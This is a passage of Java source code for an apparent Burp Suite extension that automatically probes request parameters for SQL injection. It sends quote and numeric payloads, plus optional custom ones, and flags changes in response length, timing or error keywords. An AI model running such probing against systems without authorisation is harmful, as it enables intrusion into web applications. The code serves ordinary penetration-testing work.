                originalDataLen = baseRequestResponse.response() != null ? baseRequestResponse.response().body().length() : 0;
                api.logging().logToOutput("原始响应长度：" + originalDataLen);

                api.logging().logToOutput("参数总数：" + paraLists.size());
                api.logging().logToOutput("可测试参数数：" + testableParams.size());
                api.logging().logToOutput("过滤后参数数：" + filteredParams.size());

                // 获取URL问号前面的部分作为baseUrl
                String baseUrl = url.split("\\?")[0];

                // 测试每个参数
                for (ParsedHttpParameter para : filteredParams) {
                    try {
                        testParameter(request, para, baseUrl, md5Data);
                    } catch (Exception e) {
                        api.logging().logToOutput("测试参数时出错：" + e.getMessage());
                    }
                }

                api.logging().logToOutput("URL测试完成：" + url);

                // 更新状态为完成
                for (int i = 0; i < log.size(); i++) {
                    if (md5Data.equals(log.get(i).dataMd5)) {
                        // 检查是否有任何测试结果包含报错信息或时间超时
                        boolean hasAnyError = false;
                        boolean hasAnyTimeExceeded = false;
                        
                        for (LogEntry testEntry : log2) {
                            if (testEntry.dataMd5.equals(md5Data)) {
                                if (testEntry.hasError) {
                                    hasAnyError = true;
                                }
                                // 检查是否有时间超时（通过变化信息判断）
                                if (testEntry.change != null && testEntry.change.contains("time >")) {
                                    hasAnyTimeExceeded = true;
                                }
                            }
                        }

                        // 优先显示报错，其次显示时间超时
                        if (hasAnyError) {
                            log.get(i).setState("end! [err]");
                        } else if (hasAnyTimeExceeded) {
                            log.get(i).setState("end! [time]");
                        } else {
                            log.get(i).setState("end!");
                        }
                        fireTableDataChanged();
                        break;
                    }
                }
            }
        } catch (Exception e) {
            api.logging().logToOutput("checkVul错误：" + e.getMessage());
            e.printStackTrace();
        }
    }

    private void testParameter(HttpRequest originalRequest, ParsedHttpParameter parameter, String baseUrl, String requestMd5Id) {
        try {
            String paramName = parameter.name();
            String originalValue = parameter.value();
            HttpParameterType paramType = parameter.type();

            api.logging().logToOutput("\n测试参数：" + paramName + " (类型：" + paramType + ", 值：" + originalValue + ")");

            // 基础payload列表 
            List<String> payloads = new ArrayList<>();
            payloads.add("'");       // 单引号
            payloads.add("''");      // 双引号

            // 数字参数测试 
            if (isInt == 1 && originalValue.matches("[0-9]+")) {
                payloads.add("-1");
                payloads.add("-0");
            }

            // 在每个参数测试开始时重置第一个payload的响应长度
            int firstPayloadResponseLength = 0;

            // 自定义payload 
            if (jTextAreaInt == 1 && !jTextAreaData1.isEmpty()) {
                String[] customPayloads = jTextAreaData1.split("\\n");
                for (String payload : customPayloads) {
                    payload = payload.trim();
                    if (!payload.isEmpty()) {
                        // 参数值置空逻辑 
                        if (diyPayload2 == 1 && !payload.equals("'") &&
                            !payload.equals("''") && !payload.equals("-1") && !payload.equals("-0")) {
                            // 对于自定义payload，将原始值置为空
                            sendTestRequest(originalRequest, paramName, paramType, "", payload, baseUrl, firstPayloadResponseLength, requestMd5Id);
                        } else {
                            sendTestRequest(originalRequest, paramName, paramType, originalValue + payload, payload, baseUrl, firstPayloadResponseLength, requestMd5Id);
                        }
                    }
                }
            } else {
                // 使用默认payload
                for (String payload : payloads) {
                    sendTestRequest(originalRequest, paramName, paramType, originalValue + payload, payload, baseUrl, firstPayloadResponseLength, requestMd5Id);
                }
            }

        } catch (Exception e) {
            api.logging().logToOutput("测试参数错误：" + e.getMessage());
            e.printStackTrace();
        }
    }

    private void sendTestRequest(HttpRequest originalRequest, String paramName, HttpParameterType paramType,
                                 String newValue, String payload, String baseUrl, int firstPayloadResponseLength, String requestMd5Id) {
        try {
            HttpRequest testRequest = null;
            boolean skipTest = false;

            // 特殊处理JSON参数
            if (paramType == HttpParameterType.JSON) {
                // 对于JSON参数，需要解析JSON并对特定字段进行修改
                String jsonBody = originalRequest.bodyToString();
                if (jsonBody != null && !jsonBody.trim().isEmpty()) {
                    // 改进的JSON修改逻辑，支持多种数据类型
                    String modifiedJson = replaceJsonValue(jsonBody, paramName, newValue);
                    
                    if (!modifiedJson.equals(jsonBody)) {
                        // 创建新请求
                        testRequest = originalRequest.withBody(modifiedJson);
                        api.logging().logToOutput("  -> JSON参数替换成功：" + paramName);
                    } else {
                        // 如果替换失败，尝试使用原始的参数更新方法
                        api.logging().logToOutput("  -> JSON字符串替换失败，尝试使用参数更新方法：" + paramName);
                        try {
                            testRequest = originalRequest.withUpdatedParameters(
                                burp.api.montoya.http.message.params.HttpParameter.parameter(paramName, newValue, paramType)
                            );
                        } catch (Exception e) {
                            api.logging().logToOutput("      -> 参数更新方法也失败，跳过：" + paramName + " - " + e.getMessage());
                            return;
                        }
                    }
                } else {
                    // JSON体为空，跳过
                    api.logging().logToOutput("      -> JSON体为空，跳过参数：" + paramName);
                    return;
                }
            } else {
                // 对于XML、MULTIPART_ATTRIBUTE和其他类型参数，使用原来的方法
                testRequest = originalRequest.withUpdatedParameters(
                    burp.api.montoya.http.message.params.HttpParameter.parameter(paramName, newValue, paramType)
                );
            }

            api.logging().logToOutput("  -> 发送payload：" + payload + " (新值：" + newValue + ")");

            // 记录开始时间（如果需要计时）
            long startTime = System.currentTimeMillis();

            // 发送测试请求
            HttpRequestResponse testResponse = api.http().sendRequest(testRequest);

            long endTime = System.currentTimeMillis();
            long responseTime = endTime - startTime;

            // 获取响应信息
            int responseCode = testResponse.response() != null ? testResponse.response().statusCode() : 0;
            int responseLength = testResponse.response() != null ? testResponse.response().body().length() : 0;

            // 判断变化 - 修复：优先检查响应时间，再检查响应长度
            String change;
            boolean isTimeExceeded = responseTime >= responseTimeThreshold;
            
            // 调试信息
            api.logging().logToOutput("    时间检测：响应时间=" + responseTime + "ms, 阈值=" + responseTimeThreshold + "ms, 超时=" + isTimeExceeded);
            
            // 优先检查响应时间超时
            if (isTimeExceeded) {
                change = "time > " + (responseTimeThreshold / 1000);
            } else if (responseLength == 0) {
                change = "无响应";
            } else if (payload.equals("'") || payload.equals("-1") || firstPayloadResponseLength == 0) {
                // 第一个payload，记录响应长度
                firstPayloadResponseLength = responseLength;
                
                // 检查与原始长度的差异
                int diff = responseLength - originalDataLen;
                int absDiff = Math.abs(diff);
                if (absDiff >= lengthDiffThreshold) {
                    change = "diff: " + (diff > 0 ? "+" : "") + diff;
                } else {
                    change = "";
                }
            } else {
                // 后续payload，先检查与原始长度的差异
                int diffWithOriginal = responseLength - originalDataLen;
                int absDiffWithOriginal = Math.abs(diffWithOriginal);
                boolean hasSignificantDiffWithOriginal = absDiffWithOriginal >= lengthDiffThreshold;

                // 检查与第一个payload的差异
                int diffWithFirst = responseLength - firstPayloadResponseLength;
                int absDiffWithFirst = Math.abs(diffWithFirst);
                boolean hasSignificantDiffWithFirst = absDiffWithFirst >= lengthDiffThreshold;

                if (payload.equals("''") || payload.equals("-0")) {
                    if (hasSignificantDiffWithFirst) {
                        // 第一个payload和第二个payload的长度有显著差异
                        if ((payload.equals("''") && responseLength == originalDataLen) ||
                            (payload.equals("-0") && responseLength == originalDataLen)) {
                            // 第二个payload的响应长度与原始长度相同，可能是SQL注入
                            change = "✔ ==> ?";
                        } else {
                            // 普通长度不同
                            change = "✔ " + (firstPayloadResponseLength - responseLength);
                        }
                    } else {
                        // 与第一个payload长度差异不大，检查与原始长度的差异
                        if (hasSignificantDiffWithOriginal) {
                            change = "diff: " + (diffWithOriginal > 0 ? "+" : "") + diffWithOriginal;
                        } else {
                            // 长度相同
                            change = "";
                        }
                    }
                } else {
                    // 非标准payload（包括自定义payload和payload组中的payload）
                    // 检查长度差异
                    if (hasSignificantDiffWithOriginal) {
                        change = "diff: " + (diffWithOriginal > 0 ? "+" : "") + diffWithOriginal;
                    } else {
                        // 根据payload来源显示不同标记
                        if (jTextAreaInt == 1) {
                            change = "diy payload";
                        } else {
                            change = ""; // payload组中的payload，不显示特殊标记
                        }
                    }
                }
            }

            // 检测报错信息
            boolean hasError = false;
            if (enableCustomError == 1 && !errorKeywordsList.isEmpty() && testResponse.response() != null) {
                String responseBody = testResponse.response().bodyToString();
                if (responseBody != null) {
                    for (String keyword : errorKeywordsList) {
                        if (responseBody.toLowerCase().contains(keyword.toLowerCase())) {
                            hasError = true;
                            api.logging().logToOutput("检测到报错信息关键字: " + keyword);
                            break;
                        }
                    }
                }
            }

            // 如果检测到报错信息，在原变化信息前面添加ERR!标记
            if (hasError) {
                if (change.isEmpty()) {
                    change = "ERR!";
                } else {
                    change = "ERR! " + change;
                }
            }

            // 判断状态
            String state;
            if (responseCode >= 200 && responseCode < 300) {
                state = "正常";
            } else if (responseCode >= 400 && responseCode < 500) {
                state = "客户端错误";
            } else if (responseCode >= 500) {
                state = "服务器错误";
            } else {
                state = "其他(" + responseCode + ")";
            }

            // 记录测试结果到log2 
            LogEntry testLogEntry = new LogEntry(
                count,
                clicksRepeater,
                testResponse,
                baseUrl,
                paramName,
                payload,
                change,
                requestMd5Id,  // 使用传入的MD5值，避免全局变量问题
                (int)responseTime,
                state,
                responseCode
            );
            // 设置报错信息状态
            testLogEntry.hasError = hasError;

            // 使用同步块确保线程安全
            synchronized (log2) {
                log2.add(testLogEntry);
            }

            // 如果检测到报错信息，更新原始请求的状态
            if (hasError) {
                // 查找对应的原始请求并标记有报错
                synchronized (log) {
                    for (int i = 0; i < log.size(); i++) {
                        LogEntry originalEntry = log.get(i);
                        if (originalEntry.dataMd5.equals(requestMd5Id)) {
                            originalEntry.hasAnyError = true;
                            // 如果已经完成，更新状态显示报错标记
                            if (originalEntry.state.startsWith("end")) {
                                originalEntry.setState("end! [err]");
                            } else if (originalEntry.state.equals("start")) {
                                // start状态下添加报错标记，但仍显示为start
                                originalEntry.setState("start [err]");
                            }
                            SwingUtilities.invokeLater(() -> fireTableDataChanged());
                            break;
                        }
                    }
                }
            }
            
            // 如果检测到时间超时，更新原始请求的状态（仅在没有报错的情况下）
            if (!hasError && isTimeExceeded) {
                synchronized (log) {
                    for (int i = 0; i < log.size(); i++) {
                        LogEntry originalEntry = log.get(i);
                        if (originalEntry.dataMd5.equals(requestMd5Id)) {
                            // 只有在没有报错标记的情况下才添加时间标记
                            if (originalEntry.state.startsWith("end") && !originalEntry.state.contains("[err]")) {
                                originalEntry.setState("end! [time]");
                                SwingUtilities.invokeLater(() -> fireTableDataChanged());
                            } else if (originalEntry.state.equals("start")) {
                                originalEntry.setState("start [time]");
                                SwingUtilities.invokeLater(() -> fireTableDataChanged());
                            }
                            break;
                        }
                    }
                }
            }

            // 如果当前选中了这个原始请求，更新payload表格 - 使用局部变量避免并发问题
            final String currentSelectedMd5 = dataMd5Id;
            if (currentSelectedMd5 != null && currentSelectedMd5.equals(requestMd5Id)) {
                SwingUtilities.invokeLater(() -> {
                    // 在EDT线程中安全更新UI
                    if (currentSelectedMd5.equals(dataMd5Id)) { // 再次检查是否仍然选中
                        synchronized (log2) {
                            log3.clear();
                            for (LogEntry entry : log2) {
                                if (entry.dataMd5.equals(currentSelectedMd5)) {
                                    log3.add(entry);
                                }
                            }
                        }
                        model.fireTableDataChanged();
                    }
                });
            }

            api.logging().logToOutput("    响应：代码=" + responseCode + ", 长度=" + responseLength +
                                    ", 时间=" + responseTime + "ms, 变化=" + change);

        } catch (Exception e) {
            api.logging().logToOutput("发送测试请求错误：" + e.getMessage());
            e.printStackTrace();
        }
    }

    // 刷新左侧表格数据
    private void fireTableRowsInserted(int firstRow, int lastRow) {
        SwingUtilities.invokeLater(() -> {
            if (logTable != null && logTable.getModel() instanceof AbstractTableModel) {
                ((AbstractTableModel) logTable.getModel()).fireTableRowsInserted(firstRow, lastRow);
            }
        });
    }

    // 刷新左侧表格所有数据
    private void fireTableDataChanged() {
        SwingUtilities.invokeLater(() -> {
            if (logTable != null && logTable.getModel() instanceof AbstractTableModel) {
                ((AbstractTableModel) logTable.getModel()).fireTableDataChanged();
            }
        });
    }

    // 内部类：表格 
    private class Table extends JTable {

        public Table(TableModel tableModel) {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend) {
            // 显示选中行的日志条目 - 改进线程安全性
            if (row >= 0 && row < log.size()) {
                LogEntry logEntry;
                synchronized (log) {
                    if (row >= log.size()) {
                        // 防止并发修改导致的索引越界
                        super.changeSelection(row, col, toggle, extend);
                        return;
                    }
                    logEntry = log.get(row);
                }
                
                dataMd5Id = logEntry.dataMd5;
                selectRow = logEntry.id;

                // 在EDT线程中安全更新UI
                SwingUtilities.invokeLater(() -> {
                    // 清空并重新填充log3
                    synchronized (log2) {
                        log3.clear();
                        for (LogEntry entry : log2) {
                            if (entry.dataMd5.equals(dataMd5Id)) {
                                log3.add(entry);
                            }
                        }
                    }
                    
                    // 刷新payload表格
                    model.fireTableDataChanged();
                });

                // 设置消息查看器内容
                if (logEntry.requestResponse != null) {
                    SwingUtilities.invokeLater(() -> {
                        requestViewer.setRequest(logEntry.requestResponse.request());
                        responseViewer.setResponse(logEntry.requestResponse.response());
                    });
                }
            }
            super.changeSelection(row, col, toggle, extend);
        }
    }

    // 左侧表格的TableModel
    private class LeftTableModel extends AbstractTableModel {
        @Override
        public int getRowCount() {
            return log.size();
        }

        @Override
        public int getColumnCount() {
            return 5;
        }

        @Override
        public String getColumnName(int columnIndex) {
            switch (columnIndex) {
                case 0: return "#";
                case 1: return "来源";
                case 2: return "URL";
                case 3: return "返回包长度";
                case 4: return "状态";
                default: return "";
            }
        }

        @Override
        public Class<?> getColumnClass(int columnIndex) {
            return String.class;
        }

        @Override
        public Object getValueAt(int rowIndex, int columnIndex) {
            if (rowIndex >= log.size()) return "";
            LogEntry logEntry = log.get(rowIndex);

            switch (columnIndex) {
                case 0:
                    return String.valueOf(logEntry.id);
                case 1:
                    // 转换工具来源
                    if (logEntry.tool == 4) return "Proxy";
                    else if (logEntry.tool == 64) return "Repeater";
                    else if (logEntry.tool == 1024) return "Menu";
                    else return String.valueOf(logEntry.tool);
                case 2:
                    return logEntry.url;
                case 3:
                    return String.valueOf(logEntry.responseLength);
                case 4:
                    return logEntry.state;
                default:
                    return "";
            }
        }
    }

    // 内部类：payload表格
    private class PayloadTable extends JTable {
        public PayloadTable(TableModel tableModel) {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend) {
            // 显示payload表格选中行的详细信息
            if (row < log3.size()) {
                LogEntry logEntry = log3.get(row);
                // 设置消息查看器内容
                if (logEntry.requestResponse != null) {
                    requestViewer.setRequest(logEntry.requestResponse.request());
                    responseViewer.setResponse(logEntry.requestResponse.response());
                }
            }
            super.changeSelection(row, col, toggle, extend);
        }
    }

    // 内部类：表格模型
    private class MyModel extends AbstractTableModel {
        @Override
        public int getRowCount() {
            return log3.size();
        }

        @Override
        public int getColumnCount() {
            return 6;
        }

        @Override
        public String getColumnName(int columnIndex) {
            switch (columnIndex) {
                case 0: return "参数";
                case 1: return "payload";
                case 2: return "返回包长度";
                case 3: return "变化";
                case 4: return "用时";
                case 5: return "响应码";
                default: return "";
            }
        }

        @Override
        public Class<?> getColumnClass(int columnIndex) {
            return String.class;
        }

        @Override
        public Object getValueAt(int rowIndex, int columnIndex) {
            if (rowIndex >= log3.size()) return "";
            LogEntry logEntry = log3.get(rowIndex);
            switch (columnIndex) {
                case 0: return logEntry.parameter;
                case 1: return logEntry.value;
                case 2: return logEntry.responseLength;
                case 3: return logEntry.change;
                case 4: return logEntry.times;
                case 5: return logEntry.responseCode;
                default: return "";
            }
        }
    }

    // 内部类：日志条目
    private static class LogEntry {
        final int id;
        final int tool;
        final HttpRequestResponse requestResponse;
        final String url;
        final String parameter;
        final String value;
        final String change;
        final String dataMd5;
        final int times;
        final int responseCode;
        final int responseLength;
        String state;
        boolean hasError; // 是否检测到报错信息
        boolean hasAnyError; // 该原始请求是否有任何报错信息

        LogEntry(int id, int tool, HttpRequestResponse requestResponse, String url,
                String parameter, String value, String change, String dataMd5,
                int times, String state, int responseCode) {
            this.id = id;
            this.tool = tool;
            this.requestResponse = requestResponse;
            this.url = url;
            this.parameter = parameter;
            this.value = value;
            this.change = change;
            this.dataMd5 = dataMd5;
            this.times = times;
            this.state = state;
            this.responseCode = responseCode;
            this.responseLength = requestResponse != null && requestResponse.response() != null ?
                requestResponse.response().body().length() : 0;
            this.hasError = false;
            this.hasAnyError = false;
        }

        public String setState(String state) {
            this.state = state;
            return this.state;
        }
    }

    // 内部类：请求MD5
    private static class RequestMd5 {
        final String md5Data;

        RequestMd5(String md5Data) {
            this.md5Data = md5Data;
        }
    }

    // 工具方法：MD5计算
    public static String MD5(String key) {
        char hexDigits[] = {
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'
        };
        try {
            byte[] btInput = key.getBytes();
            MessageDigest mdInst = MessageDigest.getInstance("MD5");
            mdInst.update(btInput);
            byte[] md = mdInst.digest();
            int j = md.length;
            char str[] = new char[j * 2];
            int k = 0;
            for (int i = 0; i < j; i++) {
                byte byte0 = md[i];
                str[k++] = hexDigits[byte0 >>> 4 & 0xf];
                str[k++] = hexDigits[byte0 & 0xf];
            }
            return new String(str);
        } catch (Exception e) {
            return null;
        }
    }
}
